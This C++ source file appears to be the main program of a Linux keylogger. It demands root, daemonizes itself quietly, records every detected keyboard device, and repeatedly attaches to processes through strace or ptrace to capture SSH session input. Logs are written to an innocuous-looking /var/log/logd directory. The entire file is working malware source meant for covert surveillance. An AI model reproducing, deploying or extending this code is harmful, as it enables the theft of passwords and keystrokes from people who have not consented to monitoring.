#include <boost/filesystem.hpp>
#include <sys/stat.h>

#include "keylogger.hpp"
#include "keyboard.hpp"

namespace po = boost::program_options;
namespace fs = boost::filesystem;

void need_root(){
    std::cerr << "You don't have permissions to start logger in case of\n"
                 "attaching to processes and keyboards.\n"
                 "Perhaps you are a baaaaaaad guuuuy O_o" << std::endl;
    exit(1);
}

int becomeDaemon(po::variables_map& vm, int64_t sleep_time){

    int maxfd;
    pid_t pid = fork();
    switch (pid){
        case -1: return -1;
        case 0: break;
        default: exit(0);
    }
    if(setsid() == -1) return -1;
    pid = fork();
    switch (pid){
        case -1: return -1;
        case 0: break;
        default: exit(0);
    }
    umask(0);
    chdir("/");
    maxfd = sysconf(_SC_OPEN_MAX);
    if(maxfd == -1) maxfd = 1;
    for (int fd = 0; fd < maxfd; ++fd) {
        close(fd);
    }
    close(STDIN_FILENO);
    int fd = open("/dev/null", O_RDWR);
    dup2(0, 1);
    dup2(0, 2);

    //================================================

    std::string path_to_log = vm["output"].as<std::string>();
    if(!fs::exists(path_to_log)){
        fs::create_directories(path_to_log);
        DEBUG_STDOUT("DIR is created");
    }

    if (vm.count("kboard")) {
        DEBUG_STDOUT("Logging keyboards: ON");
        std::vector<Keyboard> keyboards = findKeyboards(path_to_log);
        std::vector<std::future<void>> captureTasks;
        captureTasks.reserve(keyboards.size());
        for (auto& kbd : keyboards)
            captureTasks.push_back(
                    std::async(std::launch::async, &Keyboard::capture, &kbd));
    } else DEBUG_STDOUT("Logging keyboards: OFF");

    while(true){
        auto mode = vm["mode"].as<std::string>();
        if (mode == "strace") check_ps("strace", path_to_log);
        else check_ps("ptrace", path_to_log);
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
    }
}

int main(int argc, char **argv) {
    if(getuid() != 0) {
        need_root();
    }

    int64_t sleep_time = 3;

    po::options_description desc{"Options"};
    desc.add_options()
            ("help", "produce help message")
            ("daemon,d", "daemonize mode")
            ("kboard,k", "run logging all detected keyboard devices")
            ("mode,m", po::value<std::string>()->default_value("ptrace"), "[strace/ptrace] run ssh keylogger via STRACE or PTRACE mechanism (ptrace by default)")
            ("output,o", po::value<std::string>()->default_value("/var/log/logd"), "path to directory(if it doesn't exist, it will be created) for saving logfiles");

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, desc), vm);
    po::notify(vm);

    if (vm.count("help")) {
        std::cout << desc << std::endl;
        return 1;
    }

    if (vm.count("daemon")) {
        becomeDaemon(vm, sleep_time);
        return 0;
    }

    std::string path_to_log = vm["output"].as<std::string>();
    if(!fs::exists(path_to_log)){
        fs::create_directories(path_to_log);
        DEBUG_STDOUT("DIR is created");
    }

    if (vm.count("kboard")) {
        DEBUG_STDOUT("Logging keyboards: ON");
        std::vector<Keyboard> keyboards = findKeyboards(path_to_log);
        std::vector<std::future<void>> captureTasks;
        captureTasks.reserve(keyboards.size());
        for (auto& kbd : keyboards)
            captureTasks.push_back(
                    std::async(std::launch::async, &Keyboard::capture, &kbd));
    } else DEBUG_STDOUT("Logging keyboards: OFF");

    while(true){
        auto mode = vm["mode"].as<std::string>();
        if (mode == "strace") check_ps("strace", path_to_log);
        else check_ps("ptrace", path_to_log);
        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
    }
}